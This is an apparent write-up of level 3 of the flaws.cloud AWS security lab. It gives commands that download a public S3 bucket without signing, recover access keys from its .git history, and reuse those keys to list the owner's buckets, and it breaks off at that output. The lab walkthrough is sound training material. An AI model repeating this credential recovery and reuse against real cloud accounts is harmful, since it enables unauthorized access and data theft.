# Level 3 
To list the contents of the s3 bucket for level 3, head over to http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com
There's a .git directory along with other static files for the website. 
To download the entire bucket: 
```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-east-1
```
> --no-sign-request: request wasn't signed, i.e. credentials were not loaded while sending the request
> provide your own account's region while downloading the bucket

- Found access_keys.txt in after extracting from .git folder 
- Used those access keys to configure another profile in aws cli 

Trying to list buckets of that user.
```
aws s3 --profile scott_flaws ls
```

Output: 
```bash
kali:level_3/ (b64c8dcâœ—) $ aws s3 --profile scott_flaws ls                                                                                      [17:19:12]
